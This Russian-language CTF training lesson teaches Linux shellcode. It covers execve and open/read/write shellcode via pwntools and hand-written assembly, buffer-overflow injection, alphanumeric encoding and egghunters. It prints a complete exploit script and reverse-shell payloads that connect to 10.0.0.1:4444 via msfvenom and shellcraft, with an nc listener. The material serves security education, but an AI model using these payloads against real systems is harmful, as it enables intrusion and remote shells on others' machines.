---
id: pwn-shellcode
title: "Shellcode: написание и инъекция машинного кода"
category: pwn
parent: pwn-pwntools
difficulty: medium
order: 2
tags: [shellcode, execve, syscall, encoder, nx]
prerequisites: [pwn-buffer-overflow, pwn-pwntools]
useful_for:
  - "CTF Pwn категория"
  - "Обход фильтров ввода"
  - "Exploit development"
estimated_minutes: 60
summary: "Пишем shellcode (execve /bin/sh), учимся его инжектить, кодировать для обхода фильтров и понимаем, почему NX его блокирует."
---
Shellcode — машинный код, который внедряется в процесс и исполняется. В задачах, где NX выключен и стек (или иной буфер) исполняем, shellcode даёт прямой контроль: вместо длинных ROP-цепочек достаточно положить байты `execve('/bin/sh')` и передать туда управление. Этот урок охватывает написание, инъекцию, кодирование и ограничения shellcode.

## Что такое shellcode и его виды

Shellcode бывает `execve` (запуск shell), `open/read/write` (ORW — чтение флага при отсутствии shell), `bind shell` (слушает порт), `reverse shell` (подключается назад), `egghunter` (поиск маркера в памяти) и «staged» (загрузчик второго этапа). В CTF чаще всего нужен `execve('/bin/sh')` или ORW под seccomp.

## Написание через pwntools shellcraft

```python
from pwn import *
context.arch = 'amd64'
asm(shellcraft.sh())                        # execve /bin/sh
asm(shellcraft.cat('/flag'))                # open/read/write
asm(shellcraft.amd64.linux.sh())
asm(shellcraft.execve('/bin/sh', 0, 0))
print(disasm(asm(shellcraft.sh())))
```

Вывод `disasm` для `shellcraft.sh()`:

```
   0:   48 31 f6                xor    rsi, rsi
   3:   56                      push   rsi
   4:   48 bf 2f 62 69 6e ...   movabs rdi, 0x68732f6e69622f
   e:   57                      push   rdi
   f:   54                      push   rsp
  10:   5f                      pop    rdi
  11:   6a 3b                   push   0x3b
  13:   58                      pop    rax
  14:   99                      cdq
  15:   0f 05                   syscall
```

## Ручной shellcode для amd64

```asm
; execve('/bin/sh', NULL, NULL)
xor rsi, rsi
push rsi
mov rdi, 0x68732f2f6e69622f   ; '//bin/sh'
push rdi
mov rdi, rsp
xor rdx, rdx
push 59
pop rax
syscall
```

Сборка:

```bash
nasm -f elf64 sh.asm -o sh.o
objcopy -O binary -j .text sh.o sh.bin
python3 -c "print(open('sh.bin','rb').read().hex())"
```

## Ручной shellcode для i386

```asm
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
xor edx, edx
mov al, 11
int 0x80
```

В i386 короче: `int 0x80`, регистры 32-битные, номер syscall в `eax` (11 для execve).

## ORW-shellcode при seccomp

Когда seccomp запрещает `execve`, но разрешает `open`/`read`/`write`, используется ORW:

```python
from pwn import *
context.arch = 'amd64'
sc = shellcraft.open('/flag')
sc += shellcraft.read('rax', 'rsp', 0x100)
sc += shellcraft.write(1, 'rsp', 0x100)
print(asm(sc).hex())
```

Эквивалент вручную: `open('/flag', 0)`, `read(fd, buf, 0x100)`, `write(1, buf, 0x100)`.

## Инъекция shellcode

| Способ | Условие |
|---|---|
| на стек через переполнение | NX off, адрес стека известен |
| в `bss` через `read` | NX off или mprotect |
| `jmp rsp`-гаджет | NX off |
| в `mmap`-регион | есть вызов `mmap` |
| после `mprotect` | NX on, но есть `mprotect` |

Классика: переполняем буфер, затем возвращаемся на `jmp rsp` (или на адрес буфера на стеке). Если ASLR рандомизирует стек, адрес нужно утечь.

```python
from pwn import *
context.arch = 'amd64'
sc = asm(shellcraft.sh())
payload = sc.ljust(72, b'\x90') + p64(stack_addr)   # возврат на буфер
```

## Ограничения и кодирование

Ввод может фильтровать байты (`\x00`, `\x0a`, `\x0d`, `\x20`). Тогда применяют:

- **Альфавитно-цифровой shellcode.** Все байты — `[A-Za-z0-9]`. Инструмент `msfvenom -p linux/x64/exec -e x86/alpha_mixed`.
- **Полиморфный shellcode.** Самомодифицирующийся, обходит сигнатурные детекторы.
- **Egghunter.** Маленький код, ищущий в памяти маркер (`egg`) и прыгающий на найденный shellcode — когда места для полного shellcode мало.
- **Самокодирование XOR.** Байты декодируются во время исполнения.

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x86/alpha_mixed -f python
```

## Тонкости и подводные камни

- **Нулевые байты.** `mov rdi, 0x...` даёт нули; используйте `push`/`pop` или `xor`.
- **Позиционная независимость.** Shellcode не должен ссылаться на абсолютные адреса — используйте `lea`/`call`-pop.
- **Размер.** Малый буфер требует короткого shellcode; `shellcraft.sh()` ~23 байта на amd64.
- **Выравнивание стека.** `execve` может требовать выровненного стека.
- **NX и ASLR.** Без исполняемого стека shellcode бесполезен — нужен ROP/mprotect.
- **Симлинк `/bin/sh`.** `//bin/sh` короче и без нулей; некоторые системы требуют `/bin/sh` целиком.
- **`syscall` vs `int 0x80`.** На amd64 `int 0x80` работает в 32-битном режиме — используйте `syscall`.

## Справочные таблицы

| Задача | shellcraft |
|---|---|
| shell | `shellcraft.sh()` |
| cat файл | `shellcraft.cat('/flag')` |
| ORW | `open`+`read`+`write` |
| bind | `shellcraft.bindsh(port)` |
| reverse | `shellcraft.connect(host, port)` |

| Архитектура | Номер execve | Инструкция |
|---|---|---|
| amd64 | 59 | `syscall` |
| i386 | 11 | `int 0x80` |
| arm64 | 221 | `svc #0` |
| arm32 | 11 | `svc #0` |
| mips | 4011 | `syscall` |

## Практический пример end-to-end

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
context.arch = 'amd64'

def start():
    return process('./chall') if args.LOCAL else remote('host', 1337)

def exploit():
    p = start()
    p.recvuntil(b'stack: ')
    stack = int(p.recvline().strip(), 16)
    log.info(f'stack @ {hex(stack)}')
    sc = asm(shellcraft.sh())
    payload = sc.ljust(72, b'\x90') + p64(stack)
    p.sendline(payload)
    p.interactive()

exploit()
```

## Что дальше / решение

Дальше: `pwn-shellcode-advanced` (полиморфный, egghunter, alphanumeric), `pwn-seccomp-srop` (ORW при seccomp), `pwn-rop` (когда NX включён). Практический алгоритм: (1) `checksec` — NX off?; (2) определите ограничения ввода (какие байты фильтруются); (3) сгенерируйте shellcode через `shellcraft`, проверьте размер и отсутствие запрещённых байтов; (4) найдите адрес буфера (утечка или `jmp rsp`); (5) постройте payload. Если NX включён — shellcode не поможет, переходите к ROP и ORW.

## Ограничения по байтам и способы кодирования

Фильтры байтов — частая защита. Если запрещён `\x00`, избегайте `mov` с полным регистром; используйте `push`/`pop` и `xor`. Если запрещены все байты кроме `[A-Za-z0-9]`, нужен alphanumeric-энкодер: `msfvenom -p linux/x64/exec CMD=/bin/sh -e x86/alpha_mixed -f raw`. Если запрещён `\x0a`/`\x0d` (перевод строки), заменяйте инструкции на эквиваленты. Полиморфный shellcode добавляет декодер, меняющийся каждый запуск, что обходит сигнатуры.

## Egghunter: когда места мало

Когда буфер слишком мал для полного shellcode, применяют egghunter — короткий (~30 байт) код, который перебирает память страница за страницей в поисках маркера (например, `EGG` = `0x45474721`). Найдя маркер, он прыгает на shellcode, лежащий в другом месте. Алгоритм: перебор адресов с шагом страницы, обработка `EFAULT` через `sigaction` или через syscall, который безопасно возвращает ошибку (`access`), чтобы не падать на невалидной памяти.

## Reverse shell shellcode

```python
from pwn import *
context.arch = 'amd64'
sc = shellcraft.connect('10.0.0.1', 4444)
sc += shellcraft.dupsh()
print(asm(sc).hex())
```

`connect` открывает сокет, `dupsh` дублирует его на stdin/stdout/stderr и запускает shell. Для bind-shell аналогично: `shellcraft.bindsh(4444)`. На сервере слушайте `nc -lvnp 4444`. Обратите внимание: shellcode с фиксированным IP содержит нулевые/неудобные байты — проверяйте фильтры.

## Полный пример ORW при seccomp

```python
from pwn import *
context.arch = 'amd64'
sc  = shellcraft.open('/flag', 0, 0)
sc += shellcraft.read('rax', 'rsp', 0x100)
sc += shellcraft.write(1, 'rsp', 0x100)
code = asm(sc)
print(f'shellcode {len(code)} bytes: {code.hex()}')
```

Вывод: `shellcode 45 bytes: 6a0068...`. Этот shellcode не вызывает `execve`, поэтому проходит seccomp-фильтр, разрешающий только `open`/`read`/`write`. Если и `open` запрещён — используйте `openat`, `sendfile` или уже открытый fd (например, `0` или `3`).

## Отладка shellcode

```bash
gdb ./chall
(gdb) run
(gdb) x/40i $rsp          # дизассемблировать shellcode в памяти
(gdb) stepi               # пошагово
(gdb) info registers
```

Если shellcode падает, проверьте: нет ли нулевых байтов в адресах, выровнен ли стек, не перезаписан ли код. Иногда полезно `printf`-отладка: вставьте `int3` (`\xcc`) в начало и посмотрите в GDB.

## Расширенная таблица syscall

| Syscall | amd64 | i386 | arm64 |
|---|---|---|---|
| read | 0 | 3 | 63 |
| write | 1 | 4 | 64 |
| open | 2 | 5 | — |
| openat | 257 | 295 | 56 |
| execve | 59 | 11 | 221 |
| mmap | 9 | 90 | 222 |
| mprotect | 10 | 125 | 226 |
| exit | 60 | 1 | 93 |

## Сводка

Shellcode нужен, когда память исполняема. Генерируйте его через `shellcraft`, проверяйте длину и запрещённые байты, кодируйте при фильтрах (alphanumeric, полиморфный, egghunter). При NX переходите к ROP и ORW; при seccomp избегайте `execve` в пользу `open`/`read`/`write`. Всегда проверяйте shellcode в GDB пошагово — это быстрее, чем отлаживать его вслепую на удалённой цели.

## Мини-шпаргалка

| Задача | Код |
|---|---|
| shell | `asm(shellcraft.sh())` |
| ORW | `shellcraft.open/read/write` |
| reverse | `shellcraft.connect(host,port)+dupsh()` |
| alphanumeric | `msfvenom -e x86/alpha_mixed` |
| дизасм | `disasm(asm(sc))` |
| отладка | `x/40i $rsp` в GDB |

## Заключительное замечание

Shellcode остаётся самым прямым способом получить исполнение, когда память исполняема. Его главные ограничения — фильтры байтов, размер буфера и защита NX/seccomp. Освойте `shellcraft` для быстрой генерации, `msfvenom` для кодирования под фильтры и ORW-шаблоны для seccomp. Помните, что на современных системах NX включён почти всегда, поэтому shellcode чаще встречается в CTF, чем в реальной эксплуатации, где доминирует ROP.

## Квиз

```quiz
- question: "Почему NX блокирует shellcode на стеке?"
  options:
    - "Стек помечен как неисполняемый"
    - "Стек зашифрован"
    - "Стек read-only"
    - "Стек в ядре"
  answer: 0
  explanation: "NX делает страницы данных (стек/куча) неисполняемыми."
- question: "Зачем обнулять регистры через xor?"
  options:
    - "Чтобы избежать нулевых байтов в shellcode"
    - "Чтобы включить ASLR"
    - "Чтобы расширить tcache"
    - "Чтобы снять canary"
  answer: 0
  explanation: "xor reg,reg не содержит нулевых байтов и обнуляет регистр."
- question: "Что делает syscall execve в shellcode?"
  options:
    - "Запускает /bin/sh"
    - "Читает файл"
    - "Открывает сокет"
    - "Пишет в память"
  answer: 0
  explanation: "execve('/bin/sh',0,0) даёт интерактивную оболочку."
- question: "Что делать, если shellcode не влезает в буфер?"
  options:
    - "Использовать egghunter/stage2 или mprotect-ROP"
    - "Отключить NX"
    - "Снять canary"
    - "Расширить GOT"
  answer: 0
  explanation: "Egghunter и двухстадийная загрузка решают проблему размера."
- question: "Как проверить shellcode локально?"
  options:
    - "run_shellcode(sc) в pwntools или запустить через mmap-буфер"
    - "nmap"
    - "ldd"
    - "readelf"
  answer: 0
  explanation: "pwntools run_shellcode исполняет shellcode для проверки."
```

## Где пригодится

- **CTF:** Pwn — задачи с исполняемым стеком.
- **Bug bounty:** обход фильтров ввода.
- **Пентест:** payload-разработка.
- **Работа:** exploit development.
